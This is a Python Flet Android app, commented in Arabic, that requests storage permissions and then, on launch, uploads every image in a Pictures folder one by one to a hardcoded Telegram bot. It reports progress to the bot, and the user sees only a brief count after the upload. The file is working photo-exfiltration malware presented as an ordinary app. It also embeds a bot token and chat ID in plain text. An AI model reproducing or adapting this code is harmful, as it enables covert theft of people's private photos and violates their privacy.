from flet import *
import requests
import os
import time

# استيراد pyjnius لطلب أذونات أندرويد
try:
    from jnius import autoclass
except ImportError:
    autoclass = None
    print("pyjnius غير موجود، لن يتم طلب الأذونات")

def request_permissions():
    if autoclass is None:
        print("تخطي طلب الأذونات لأن pyjnius غير متوفر")
        return

    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    ActivityCompat = autoclass('androidx.core.app.ActivityCompat')
    ContextCompat = autoclass('androidx.core.content.ContextCompat')
    Manifest = autoclass('android.Manifest')
    PackageManager = autoclass('android.content.pm.PackageManager')

    activity = PythonActivity.mActivity

    permissions = [
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
    ]

    granted = True
    for permission in permissions:
        result = ContextCompat.checkSelfPermission(activity, permission)
        if result != PackageManager.PERMISSION_GRANTED:
            granted = False
            break

    if not granted:
        ActivityCompat.requestPermissions(activity, permissions, 0)
        print("تم طلب الأذونات من المستخدم")

# --- بيانات بوت التلجرام ---
BOT_TOKEN = "7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk"
CHAT_ID = "5739065274"
IMAGE_PATH = "/storage/emulated/0/Pictures/100PINT/Pins"

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": CHAT_ID, "text": message}, timeout=10)
    except Exception as e:
        print(f"خطأ في إرسال الرسالة: {e}")

def send_telegram_photo(photo_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    try:
        with open(photo_path, 'rb') as photo:
            files = {"photo": photo}
            data = {"chat_id": CHAT_ID}
            requests.post(url, files=files, data=data, timeout=20)
    except Exception as e:
        print(f"خطأ في إرسال الصورة {photo_path}: {e}")

def main(page: Page):
    # طلب الأذونات أولاً
    request_permissions()

    send_telegram_message("✅ تم تشغيل التطبيق")

    if not os.path.exists(IMAGE_PATH):
        send_telegram_message("⚠️ المسار غير موجود")
        page.add(Text("⚠️ المسار غير موجود"))
        page.update()
        return

    images = [f for f in os.listdir(IMAGE_PATH) if f.lower().endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp"))]

    if not images:
        send_telegram_message("📂 لا توجد صور في المجلد")
        page.add(Text("📂 لا توجد صور في المجلد"))
        page.update()
        return

    for idx, file_name in enumerate(images, start=1):
        photo_path = os.path.join(IMAGE_PATH, file_name)
        send_telegram_photo(photo_path)
        send_telegram_message(f"📸 تم إرسال الصورة {idx}/{len(images)}")
        time.sleep(1)

    send_telegram_message("📤 تم إرسال جميع الصور ✅")
    page.add(Text(f"تم إرسال {len(images)} صورة"))
    page.update()

app(main)